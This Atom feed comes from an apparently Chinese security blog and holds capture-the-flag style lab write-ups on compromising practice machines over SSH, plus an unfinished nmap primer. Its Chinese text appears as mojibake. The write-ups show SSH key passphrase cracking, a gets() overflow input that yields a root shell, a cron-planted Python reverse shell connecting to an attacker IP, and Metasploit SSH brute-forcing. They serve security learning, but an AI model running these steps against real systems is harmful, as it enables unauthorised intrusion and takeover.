<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://M0kY4n.github.io/Websec</id>
    <title>MokYan</title>
    <updated>2021-07-04T09:31:46.856Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://M0kY4n.github.io/Websec"/>
    <link rel="self" href="https://M0kY4n.github.io/Websec/atom.xml"/>
    <subtitle>The more you know, the more you don&apos;t know</subtitle>
    <logo>https://M0kY4n.github.io/Websec/images/avatar.png</logo>
    <icon>https://M0kY4n.github.io/Websec/favicon.ico</icon>
    <rights>All rights reserved 2021, MokYan</rights>
    <entry>
        <title type="html"><![CDATA[SSH-ç§é’¥æ³„éœ²]]></title>
        <id>https://M0kY4n.github.io/Websec/post/ssh-si-yao-xie-lu/</id>
        <link href="https://M0kY4n.github.io/Websec/post/ssh-si-yao-xie-lu/">
        </link>
        <updated>2021-05-19T15:21:08.000Z</updated>
        <content type="html"><![CDATA[<h2 id="0x00-ç¯å¢ƒé…ç½®">0x00 ç¯å¢ƒé…ç½®</h2>
<ol>
<li>SSH-ç§é’¥æ³„éœ²é¶æœº</li>
<li>Kali æ”»å‡»æœº</li>
<li>é¶æœºä¸æ”»å‡»æœºå¤„äºåŒä¸€ç½‘æ®µ</li>
</ol>
<h2 id="0x01-ä¿¡æ¯æ”¶é›†">0x01 ä¿¡æ¯æ”¶é›†</h2>
<ol>
<li>
<p>å¯»æ‰¾é¶æœºIP</p>
<p>å¯ä»¥ä½¿ç”¨<code>netdiscover</code>æˆ–è€… <code>nmap</code>è¿›è¡ŒIPæ‰«æ</p>
<pre><code class="language-shell">netdiscover 10.112.132.0/24
nmap 10.112.132.0/24
</code></pre>
</li>
<li>
<p>æ‰«ææœåŠ¡</p>
<p>å› ä¸ºæ˜¯ä½¿ç”¨äº†nmapè¿›è¡Œäº†æ‰«æIP , æ‰€ä»¥é¡ºä¾¿æŠŠæœåŠ¡ä¹Ÿä¸€èµ·æ‰«æäº†</p>
<pre><code class="language-shell">nmap -A -T4 10.112.132.16
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://github.com/MokYan/Figurebed/blob/master/drone/SSH-Server/SSH-%20private%20key%20is%20eaked/nmap.jpg?raw=true" alt="nmap.jpg" loading="lazy"></figure>
</li>
<li>
<p>ç›®å½•æ‰«æ</p>
<p>ä»nmapæ‰«æç»“æœå¾—çŸ¥ , ä¸€å…±å­˜åœ¨3ä¸ªç«¯å£ 22(SSH) , 80(HTTP) , 31337(ELIET) , åœ¨nmap ç»¼åˆæ‰«æé€‰é¡¹æ‰«æé¶æœº , èƒ½å‘ç° 31337ä¹Ÿæ˜¯è¿è¡ŒHttpæœåŠ¡ , å¯¹ä¸¤ä¸ªHttpæœåŠ¡çš„ç«¯å£è¿›è¡Œç›®å½•æ‰«æ , 80ç»“æœä¸ºç©º , 31337ç»“æœå‘ç°<code>.ssh</code>æ–‡ä»¶å¤¹</p>
<figure data-type="image" tabindex="2"><img src="https://github.com/MokYan/Figurebed/blob/master/drone/SSH-Server/SSH-%20private%20key%20is%20eaked/dirsearch.jpg?raw=true" alt="dirsearch" loading="lazy"></figure>
<p>robots.txt æœ‰ä¸ª/taxesç›®å½• , è®¿é—®å¾—åˆ°ä¸€ä¸ªFlag</p>
<figure data-type="image" tabindex="3"><img src="https://github.com/MokYan/Figurebed/blob/master/drone/SSH-Server/SSH-%20private%20key%20is%20eaked/robots.txt.jpg?raw=true" alt="robots.txt" loading="lazy"></figure>
<figure data-type="image" tabindex="4"><img src="https://github.com/MokYan/Figurebed/blob/master/drone/SSH-Server/SSH-%20private%20key%20is%20eaked/Flag1.jpg?raw=true" alt="Flag1" loading="lazy"></figure>
<p>è®¿é—®<code>.ssh</code>ä¸‹è½½ä¸‰ä¸ªæ–‡ä»¶</p>
<p>â€‹	a.	authorized_keys - å…¬é’¥</p>
<p>â€‹	b.	id_rsa - ç§é’¥</p>
<p>â€‹	c.	id_rsa.pub - ç§é’¥è¯ä¹¦</p>
</li>
</ol>
<h2 id="0x02-sshè¿æ¥">0x02 SSHè¿æ¥</h2>
<p>å…³äºSSHçš„ä¸€äº›çŸ¥è¯†-è½¬è‡ª<code>TelCruel</code> <a href="https://telcruel.gitee.io/2019/09/21/SSH/">ä¼ é€é—¨</a></p>
<ol>
<li>
<p>å…¬é’¥</p>
<p>æŸ¥çœ‹å…¬é’¥å‘ç°ç”¨æˆ·åä¸º<code>simon</code></p>
<figure data-type="image" tabindex="5"><img src="https://github.com/MokYan/Figurebed/blob/master/drone/SSH-Server/SSH-%20private%20key%20is%20eaked/autorized_key.jpg?raw=true" alt="autorized_keys" loading="lazy"></figure>
</li>
<li>
<p>ç§é’¥</p>
<p>å°è¯•ä½¿ç”¨å…¬é’¥ç™»å½• , æç¤ºæ²¡æƒé™</p>
<pre><code class="language-shell">ssh -i id_rsa simon@10.112.132.16
</code></pre>
<figure data-type="image" tabindex="6"><img src="https://github.com/MokYan/Figurebed/blob/master/drone/SSH-Server/SSH-%20private%20key%20is%20eaked/Permission_Denied.jpg?raw=true" alt="Permission_Denied" loading="lazy"></figure>
<p>â€‹</p>
<p>ä¿®æ”¹æƒé™ , å†æ¬¡å°è¯•ç™»å½• , æç¤ºéœ€è¦å¯†ç </p>
<pre><code class="language-shell">chmod 600 id_rsa
ssh -i id_rsa simon@10.112.132.16
</code></pre>
<figure data-type="image" tabindex="7"><img src="https://github.com/MokYan/Figurebed/blob/master/drone/SSH-Server/SSH-%20private%20key%20is%20eaked/SSH_login_not_password.jpg?raw=true" alt="SSH_login_not_password" loading="lazy"></figure>
<p>â€‹</p>
</li>
<li>
<p>ç ´è§£ç§é’¥</p>
<p>ä½¿ç”¨<code>ssh2john</code>å¯¹ id_rsa ç§˜é’¥ä¿¡æ¯è½¬ä¸º Johnå¯ä»¥è¯†åˆ«çš„ä¿¡æ¯ , è®©ä½¿ç”¨zcat ç ´è§£isacrack ä¿¡æ¯</p>
<pre><code class="language-shell">/usr/share/john/ssh2john.py id_rsa &gt; isacrack
zcat /usr/share/wordlists/rockyou.txt.gz | john --pipe --rules isacrack
</code></pre>
<figure data-type="image" tabindex="8"><img src="https://github.com/MokYan/Figurebed/blob/master/drone/SSH-Server/SSH-%20private%20key%20is%20eaked/Zcat&amp;Join.jpg?raw=true" alt="Zcat&amp;Join" loading="lazy"></figure>
<p>ç ´è§£å‡ºå¯†ç ä¸º: <code>starwars</code> , å†æ¬¡ç™»å½•</p>
<figure data-type="image" tabindex="9"><img src="https://github.com/MokYan/Figurebed/blob/master/drone/SSH-Server/SSH-%20private%20key%20is%20eaked/SSH_login.jpg?raw=true" alt="SSH_login" loading="lazy"></figure>
</li>
<li>
<p>ä¿¡æ¯æ”¶é›†</p>
<p>åœ¨root ç›®å½•ä¸‹ æœ‰ä¸ª <code>flag.txt</code>ä¸ 'read_message.c'  , flag.txtæ²¡æƒé™æ‰“å¼€ , read_message.cæŸ¥çœ‹å‘ç°ç¬¬äºŒä¸ªflag  , ä¸”æç¤ºæˆ‘ä»¬éœ€è¦æ‰§è¡Œè¿™ä¸ªæºç </p>
<figure data-type="image" tabindex="10"><img src="https://github.com/MokYan/Figurebed/blob/master/drone/SSH-Server/SSH-%20private%20key%20is%20eaked/Flag2.jpg?raw=true" alt="Flag2" loading="lazy"></figure>
<p>æŸ¥æ‰¾å·²ç»ç¼–è¯‘çš„ç¨‹åº,å¹¶æ‰§è¡Œ</p>
<pre><code class="language-shel">find / -name &quot;*read_message*&quot; 2&gt;/dev/null
</code></pre>
</li>
</ol>
<h2 id="0x03-ææƒ">0x03 ææƒ</h2>
<p>â€‹	è¿™ä¸ªç¨‹åºæ˜¯ä¸€ä¸ªç®€å•çš„æº¢å‡ºæ”»å‡»(ç„¶è€Œæˆ‘ä¸ä¼š (æ±—é¢œ)),ç›´æ¥ç…§æ¬<code>TelCruel</code>çš„WPäº†</p>
<pre><code> è¿™é‡Œå› ä¸ºgetsï¼ˆbufï¼‰æ²¡æœ‰é™åˆ¶è¯»å–çš„é•¿åº¦ï¼Œä½†æ˜¯buf[]è¿™ä¸ªæ•°ç»„åªèƒ½å‚¨å­˜20ä¸ªå­—ç¬¦ï¼Œé‚£ä¹ˆè¶…è¿‡20ä¸ªå­—ç¬¦çš„å°±ä¼šå­˜å…¥ç¼“å†²åŒºï¼Œå°†åé¢çš„å†…å®¹è¦†ç›–ã€‚ç„¶åå½“æ‰§è¡Œåˆ°execveçš„æ—¶å€™åŸæ¥è¦æ‰§è¡Œprogram[]å†…çš„å­—ç¬¦ï¼Œè¢«è¦†ç›–åå°±å¯ä»¥åˆ©ç”¨äº†ã€‚æ‰€ä»¥åªè¦è¾“å…¥SimonAAAAAAAAAAAAAAA/bin/sh,å³å¯è¿›å…¥rootçš„shell
</code></pre>
<p>â€‹	æ‰§è¡Œå , æƒé™æå‡è‡³root , æŸ¥çœ‹flag.txt å¾—åˆ° ç¬¬ä¸‰ä¸ªFlag</p>
<p>â€‹	<img src="https://github.com/MokYan/Figurebed/blob/master/drone/SSH-Server/SSH-%20private%20key%20is%20eaked/flag3.jpg?raw=true" alt="Flag3" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[SSH-æœåŠ¡æ¸—é€rootä¸»æœº]]></title>
        <id>https://M0kY4n.github.io/Websec/post/ssh-fu-wu-shen-tou-root-zhu-ji/</id>
        <link href="https://M0kY4n.github.io/Websec/post/ssh-fu-wu-shen-tou-root-zhu-ji/">
        </link>
        <updated>2021-04-01T12:14:06.000Z</updated>
        <content type="html"><![CDATA[<h2 id="0x00-ç¯å¢ƒé…ç½®">0x00 ç¯å¢ƒé…ç½®</h2>
<ol>
<li>SSH-æœåŠ¡æ¸—é€rootä¸»æœºé¶æœº</li>
<li>Kali æ”»å‡»æœº</li>
<li>é¶æœºä¸æ”»å‡»æœºå¤„äºåŒä¸€ç½‘æ®µ</li>
</ol>
<h2 id="0x01-ä¿¡æ¯æ”¶é›†">0x01 ä¿¡æ¯æ”¶é›†</h2>
<ol>
<li>
<p>å¯»æ‰¾é¶æœºIP</p>
<p>ç”±äºKaliä¸é¶æœºåœ¨ç»Ÿä¸€ç½‘æ®µ , æ‰€ä»¥ç›´æ¥æ‰«Kali IPæ‰€åœ¨çš„ç½‘æ®µ , ä½¿ç”¨netdiscoverè¿›è¡Œæ‰«æ</p>
<pre><code class="language-shell">netdiscover 10.112.132.0/24
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/netdiscover.jpg" alt="netdiscover" loading="lazy"></figure>
</li>
<li>
<p>æ‰«æé¶æœºæœåŠ¡</p>
<p>å¾—çŸ¥é¶æœºçš„IPå , ä½¿ç”¨nmapè¿›è¡ŒæœåŠ¡æ‰«æ , <a href="https://mokyan.github.io/post/nmap-xue-xi-shou-ce/">nmapå­¦ä¹ æ‰‹å†Œ</a>ä¼ é€é—¨</p>
<pre><code class="language-shell">nmap -A -T4 10.112.132.18
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/SSH-nmap-A.jpg" alt="nmap-A" loading="lazy"></figure>
</li>
</ol>
<p>3.è®¿é—®ç«¯å£æœåŠ¡</p>
<p>â€‹	ä»æ‰«æç»“æœä¸­å‘ç°80ç«¯å£ , è®¿é—®80ç«¯å£ , é€šè¿‡wappalyzer , ç¡®å®šæ˜¯ä¸€ä¸ªé™æ€HTMLé¡µé¢ , ä¸­é—´ä»¶ä¸ºApache , ç³»ç»Ÿä¸ºDebian , é¡µé¢æœ‰å‡ ä¸ª äººå ä¸ é‚®ç®±</p>
<p>â€‹	<img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/about-Us.jpg" alt="äººåä¸é‚®ç®±" loading="lazy"></p>
<p>â€‹	é€šè¿‡nmapæ‰«æç»“æœå’Œrobots.txtå†…å®¹ , å¾—åˆ°<code>/wordpress-blog</code>å’Œ<code>/files</code>ä¸¤ä¸ªç›®å½• , ä¸€ä¸ªä¸ºç©º , ä¸€ä¸ªè®¿é—®å¾—åˆ° <code>YOU JUST GOT TROLLED</code> æ·¦...</p>
<p>â€‹	ç»§ç»­æ·±åº¦æŸ¥æ‰¾ , è¿›è¡Œç›®å½•çˆ†ç ´ , ä½¿ç”¨ <code>dirsearch</code>è¿›è¡Œç›®å½•çˆ†ç ´ <a href="https://github.com/maurosoria/dirsearch">dirsearchä¼ é€é—¨</a></p>
<pre><code class="language-shell">python3 dirsearch.py -u http://10.112.132.18 
</code></pre>
<p>â€‹	<img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/dirsearch.jpg" alt="dirsearch" loading="lazy"></p>
<p>â€‹	dirsearch æ‰«æç»“æœå‘ç°ä¸€ä¸ªåä¸º <code>icons</code> çš„ç›®å½• , è®¿é—®ç›®å½• , å‘ç°ä¸€ä¸ªå¥‡æ€ªçš„txtæ–‡ä»¶ , æ‰“å¼€ç«Ÿæ˜¯ä¸€ä¸ªSSHçš„å¯†é’¥æ–‡ä»¶</p>
<p>â€‹	<img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/txtfile.jpg" alt="txtfile" loading="lazy"></p>
<p>â€‹	<img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/SSH-Key.jpg" alt="SSH-KEY" loading="lazy"></p>
<p>â€‹	å¾—åˆ°SSHå¯†é’¥ , ç»“åˆä¹‹å‰æ‹¿åˆ°çš„äººåå’Œé‚®ç®± , å°è¯•è¿›è¡ŒSSHç™»å½•</p>
<h2 id="0x02-sshç™»å½•">0x02 SSHç™»å½•</h2>
<pre><code class="language-shell">ssh -i Key_File Username@Host
</code></pre>
<p>ä½¿ç”¨äººåç™»å½• , åªæœ‰ martin æ˜¯å¯ä»¥ç™»å½• , ä¸”å¯†ç ä¸ºç©º , å›è½¦å°±èƒ½ç›´æ¥è¿›å» !</p>
<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/SSH-Login.jpg" alt="SSH-Login" loading="lazy"></figure>
<p>æŸ¥çœ‹äº†æƒé™ , ä¸æ˜¯rootçš„ , éœ€è¦ææƒ , <a href="https://zhuanlan.zhihu.com/p/341658060">linuxææƒå¸¸ç”¨æ–¹å¼</a></p>
<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/SSH-id.jpg" alt="SSH-id" loading="lazy"></figure>
<p>æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡ , å‘ç° <strong>jimmy</strong> åˆ›å»ºäº†ä¸€ä¸ªæ¯5åˆ†é’Ÿå°±æ‰§è¡Œä¸€æ¬¡çš„Pythonæ–‡ä»¶ <strong>sekurity.py</strong> çš„è®¡åˆ’ä»»åŠ¡</p>
<pre><code class="language-shell">cat /etc/crontab
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/crontab.jpg" alt="crontab" loading="lazy"></figure>
<p>æŸ¥çœ‹è¿™ä¸ªPythonæ–‡ä»¶ , å‘ç°ä¸å­˜åœ¨ ! å¯ä»¥å‘æ­¤å¤„è¿›è¡Œåå¼¹shell , æŸ¥çœ‹æ˜¯å¦å…·æœ‰æ›´é«˜çš„æƒé™</p>
<pre><code class="language-shell">martin@debian:~$ cat /tmp/sekurity.py
cat: /tmp/sekurity.py: Aucun fichier ou dossier de ce type
martin@debian:~$ 

</code></pre>
<p>åˆ›å»ºsekurity.pyæ–‡ä»¶ , ç¼–å†™è„šæœ¬</p>
<pre><code class="language-shell">#åˆ›å»ºè„šæœ¬
vi /tmp/sekurity.py

#ç¼–è¾‘è„šæœ¬
#!/usr/bin/python
import os,socket,subprocess
s=socket.socket()
s.connect((&quot;10.112.132.16&quot;,25565)   #æ”»å‡»æœºIPï¼Œæ”»å‡»æœºç›‘å¬ç«¯å£ï¼ˆä»»æ„ç©ºé—²ç«¯å£ï¼‰
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])

# ESC -&gt; å†’å· -&gt; wq ä¿å­˜é€€å‡º
# æ·»åŠ æ‰§è¡Œæƒé™
chmod +x /tmp/sekurity.py
</code></pre>
<p>åœ¨æ”»å‡»æœºä¸Šé¢å¼€å¯ç›‘å¬ , æ¯5åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ , è€å¿ƒç­‰å¾…</p>
<pre><code class="language-shell">nc -lvp 25565
</code></pre>
<p>è¿æ¥æˆåŠŸ , ç”¨æˆ·<strong>jimmy</strong>ä¾æ—§ä¸æ˜¯ rootæƒé™</p>
<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/shell-id.jpg" alt="shell-id" loading="lazy"></figure>
<h2 id="0x03-sshçˆ†ç ´">0x03 SSHçˆ†ç ´</h2>
<p>æ²¡åŠæ³•,åªèƒ½çˆ†ç ´æœ€åä¸€ä¸ªç”¨æˆ· <strong>hadi</strong> , ä½¿ç”¨å“è½©å­—å…¸åˆ›å»ºä¸€ä¸ªå­—å…¸ , åœ¨ç½‘ä¸Šå·²ç»æœ‰äººè·‘å‡ºæ¥å¯†ç ä¸º &quot;hadi123&quot; , æ‰€ä»¥æˆ‘ä»¬åˆ›å»ºèŒƒå›´ hadi100-hadi199 , ä¸»è¦ä»‹ç»çˆ†ç ´æ–¹æ³• !</p>
<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/create-dist.jpg" alt="create-dist" loading="lazy"></figure>
<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/dist.jpg" alt="dist" loading="lazy"></figure>
<p>ä½¿ç”¨ <strong>msfconsole</strong> , è¿›è¡ŒSSHçˆ†ç ´</p>
<pre><code class="language-shell">msfconsole

search ssh	#æœç´¢sshçˆ†ç ´çš„è„šæœ¬
#auxiliary/scanner/ssh/ssh_login è¿™ä¸ªå°±æ˜¯sshç™»å½•çˆ†ç ´çš„è„šæœ¬

use auxiliary/scanner/ssh/ssh_login		#ä½¿ç”¨è„šæœ¬
show options	#æ˜¾ç¤ºé€‰é¡¹

set rhosts 10.112.132.19	#è®¾ç½®é¶æœºip
set username hadi	#è®¾ç½®ç”¨æˆ·å	
set pass_file /home/mokyan/æ¡Œé¢/password.txt	#è®¾ç½®å¯†ç 
set threads 10	#è®¾ç½®çº¿ç¨‹
set verbose true	#è®¾ç½®è¾“å‡ºè¯¦ç»†ä¿¡æ¯

#è®¾ç½®å®Œæ¯• , runè¿è¡Œ
run
</code></pre>
<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/msfconsole-options.jpg" alt="msfconsole-options" loading="lazy"></figure>
<p>çˆ†ç ´æˆåŠŸ , æç¤ºä¸€ä¸ªä¼šè¯æ‰“å¼€</p>
<figure data-type="image" tabindex="10"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/msfconsole-run.jpg" alt="msfconsole-run" loading="lazy"></figure>
<p>æ‰“å¼€ä¼šè¯,å¹¶ä¼˜åŒ–shell</p>
<pre><code class="language-shell">session -i 1

python -c &quot;import pty; pty.spawn('/bin/bash')&quot;
</code></pre>
<figure data-type="image" tabindex="11"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/msfconsole-shell.jpg" alt="msfconsole-shell" loading="lazy"></figure>
<p>ä½¿ç”¨su åˆ‡æ¢root , å¯†ç ç»è¿‡å°è¯•ä¸ºhadi123 , åœ¨rootç›®å½•ä¸‹æ‰¾åˆ° flag.txt</p>
<figure data-type="image" tabindex="12"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/flag.jpg" alt="flag" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Nmap å­¦ä¹ æ‰‹å†Œ]]></title>
        <id>https://M0kY4n.github.io/Websec/post/nmap-xue-xi-shou-ce/</id>
        <link href="https://M0kY4n.github.io/Websec/post/nmap-xue-xi-shou-ce/">
        </link>
        <updated>2021-03-12T13:19:54.000Z</updated>
        <content type="html"><![CDATA[<p>nmapå­¦ä¹ æ‰‹å†Œ</p>
<h1 id="nmap-æè¿°">nmap æè¿°</h1>
<p>â€‹		Nmap (â€œNetwork Mapper(ç½‘ç»œæ˜ å°„å™¨)â€) æ˜¯ä¸€æ¬¾å¼€æ”¾æºä»£ç çš„ ç½‘ç»œæ¢æµ‹å’Œå®‰å…¨å®¡æ ¸çš„å·¥å…·ã€‚å®ƒçš„è®¾è®¡ç›®æ ‡æ˜¯å¿«é€Ÿåœ°æ‰«æå¤§å‹ç½‘ç»œï¼Œå½“ç„¶ç”¨å®ƒæ‰«æå•ä¸ª ä¸»æœºä¹Ÿæ²¡æœ‰é—®é¢˜ã€‚Nmapä»¥æ–°é¢–çš„æ–¹å¼ä½¿ç”¨åŸå§‹IPæŠ¥æ–‡æ¥å‘ç°ç½‘ç»œä¸Šæœ‰å“ªäº›ä¸»æœºï¼Œé‚£äº› ä¸»æœºæä¾›ä»€ä¹ˆæœåŠ¡(åº”ç”¨ç¨‹åºåå’Œç‰ˆæœ¬)ï¼Œé‚£äº›æœåŠ¡è¿è¡Œåœ¨ä»€ä¹ˆæ“ä½œç³»ç»Ÿ(åŒ…æ‹¬ç‰ˆæœ¬ä¿¡æ¯)ï¼Œ å®ƒä»¬ä½¿ç”¨ä»€ä¹ˆç±»å‹çš„æŠ¥æ–‡è¿‡æ»¤å™¨/é˜²ç«å¢™ï¼Œä»¥åŠä¸€å †å…¶å®ƒåŠŸèƒ½ã€‚è™½ç„¶Nmapé€šå¸¸ç”¨äºå®‰å…¨å®¡æ ¸ï¼Œ è®¸å¤šç³»ç»Ÿç®¡ç†å‘˜å’Œç½‘ç»œç®¡ç†å‘˜ä¹Ÿç”¨å®ƒæ¥åšä¸€äº›æ—¥å¸¸çš„å·¥ä½œï¼Œæ¯”å¦‚æŸ¥çœ‹æ•´ä¸ªç½‘ç»œçš„ä¿¡æ¯ï¼Œ ç®¡ç†æœåŠ¡å‡çº§è®¡åˆ’ï¼Œä»¥åŠç›‘è§†ä¸»æœºå’ŒæœåŠ¡çš„è¿è¡Œã€‚ â€”â€” æ¥è‡ª<a href="https://nmap.org/man/zh/index.html">nmapå®˜ç½‘</a></p>
<br>
<br>
<h1 id="nmapè¯­æ³•">nmapè¯­æ³•</h1>
<pre><code class="language-shell">nmap [æ‰«æç±»å‹&amp;é€‰é¡¹] (ç›®æ ‡)
</code></pre>
<br>
<br>
<h1 id="nmapç›®æ ‡">nmapç›®æ ‡</h1>
<p>nmapçš„ç›®æ ‡å¯ä»¥ä¼ é€’<strong>ä¸»æœºå , IPåœ°å€ , ç½‘æ®µ</strong>ç­‰</p>
<br>
<br>
<h1 id="nmapæ‰«æç±»å‹é€‰é¡¹">nmapæ‰«æç±»å‹&amp;é€‰é¡¹</h1>
<h2 id="å¿«é€Ÿæ‰«æ">å¿«é€Ÿæ‰«æ</h2>
<p>nmap 192.168.50.148</p>
<p>nmapä¼šå‘é€ä¸€ä¸ªpingåŒ… , æ¥æ£€æµ‹ç›®æ ‡ä¸»æœºä¸Šä»¥å¼€æ”¾çš„ç«¯å£(èŒƒå›´æš‚ä¸æ¸…æ¥š) , ä¸æ¨èæ­¤æ–¹æ³•æ£€æµ‹,å› ä¸ºç»“æœæ¯”è¾ƒæ¨¡ç³Š</p>
<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/nmap/nmap-scan.jpg" alt="nmap æ‰«æ" loading="lazy"></figure>
<br>
<h2 id="ä¸»æœºå‘ç°">ä¸»æœºå‘ç°</h2>
<h3 id="-sl-åˆ—è¡¨å‘ç°">-sL : åˆ—è¡¨å‘ç°</h3>
<p>â€‹	ä»…å¯¹å‘ç°ä¸»æœºåˆ—å‡ºæ¥,ä¸è¿›è¡Œä»»ä½•æ‰«æ</p>
<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/nmap/nmap-sL.jpg" alt="nmap -sLæ‰«æ" loading="lazy"></figure>
<h3 id="-sp-pingæ‰«æ">-sP : Pingæ‰«æ</h3>
<p>â€‹	åªç¡®å®šæ˜¯å¦åœ¨çº¿,ä¸è¿›è¡Œæ›´æ·±ä¸€æ­¥æ‰«æ</p>
<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/nmap/nmap-sP.jpg" alt="nmap -sPæ‰«æ" loading="lazy"></figure>
<br>
<h2 id="æ‰«ææŠ€å·§">æ‰«ææŠ€å·§</h2>
<h3 id="-ss-åŠå¼€æ”¾æ‰«æ">-sS : åŠå¼€æ”¾æ‰«æ</h3>
<p>â€‹	ä½¿ç”¨é¢‘ç‡æ¯”è¾ƒé«˜çš„æ‰«æç±»å‹ , <a href="https://baike.baidu.com/item/SYN/8880122?fr=aladdin">SYN</a>æ‰«æ , åˆç§°ä¸ºåŠå¼€æ”¾æ‰«æ , å®ƒä¸éœ€è¦å»ºç«‹ä¸€ä¸ªå®Œæ•´<a href="https://baike.baidu.com/item/TCP/33012?fr=aladdin">TCP</a>è¿æ¥(å»ºç«‹ä¸€æ¬¡TCPéœ€è¦è¿›è¡Œä¸‰æ¬¡æ¡æ‰‹ , è€Œç¬¬ä¸€æ¬¡æ¡æ‰‹åˆ™æ˜¯å‘é€SYNæŠ¥æ–‡),å› æ­¤ TCP SYN Scan(sS) è¢«ç§°ä¸ºåŠå¼€æ”¾æ‰«æ</p>
<ul>
<li>
<p>ä¼˜ç‚¹ : nmap å‘é€ SYNåŒ…åˆ°ç›®æ ‡æ˜¯ä¸ä¼šäº§ç”Ÿä»»ä½•ä¼šè¯ , ç›®æ ‡ä¸»æœºå‡ ä¹ä¸ä¼šæŠŠè¿æ¥è®°å…¥ç³»ç»Ÿæ—¥å¿—(å¹¶éä¸€å®š ! ! ! , èƒ½æœ‰æ•ˆé˜»æ­¢ç›®æ ‡åˆ¤æ–­ä¸ºæ‰«ææ”»å‡») , æ‰«æé€Ÿåº¦å¿« , æ•ˆç‡é«˜ , åœ¨å·¥ä½œä¸­ä½¿ç”¨é¢‘ç‡è¾ƒé«˜</p>
</li>
<li>
<p>ç¼ºç‚¹ : æ‰§è¡Œå‘½ä»¤éœ€è¦ç³»ç»Ÿæœ€é«˜æƒé™,å³ root æˆ–è€… Administrator æƒé™</p>
<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/nmap/nmap-sS.jpg" alt="nmap -sSæ‰«æ" loading="lazy"></figure>
</li>
</ul>
<h3 id="-st-tcpæ‰«æ">-sT : TCPæ‰«æ</h3>
<p>â€‹	TCP connect() Scan (sT) , ç›¸å¯¹äºTCP SYN Scan , TCP connect() Scan æ˜¯é»˜è®¤çš„æ‰«ææ¨¡å¼,ä½¿ç”¨TCP connect()æ‰«æéœ€è¦è°ƒç”¨ç³»ç»Ÿçš„connect()</p>
<ul>
<li>
<p>ä¼˜ç‚¹ : æ‰§è¡Œå‘½ä»¤æ— éœ€ç³»ç»Ÿæœ€é«˜æƒé™ , æ™®é€šç”¨æˆ·äº¦å¯æ‰§è¡Œå‘½ä»¤</p>
</li>
<li>
<p>ç¼ºç‚¹ : ç”±äºæ‰«æä¼šäº§ç”Ÿä¼šè¯ , æ‰€ä»¥ç›®æ ‡ä¸»æœºä¼šè®°å½•å¤§é‡çš„è¿æ¥è¯·æ±‚è®°å…¥ç³»ç»Ÿæ—¥å¿— , å¹¶ä¸”è‹¥æœ‰é˜²æŠ¤ç¨‹åºåˆ™ä¼šè¯†åˆ«å‡ºæ‰«ææ”»å‡» , å› ä¸ºè¦è¿›è¡Œä¸‰æ¬¡æ¡æ‰‹ , æ‰€ä»¥é€Ÿåº¦è¾ƒæ…¢ , æ•ˆç‡è¾ƒä½</p>
<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/nmap/nmap-sT.jpg" alt="nmap -sTæ‰«æ" loading="lazy"></figure>
</li>
</ul>
<h3 id="-su-udpæ‰«æ">-sU : UDPæ‰«æ</h3>
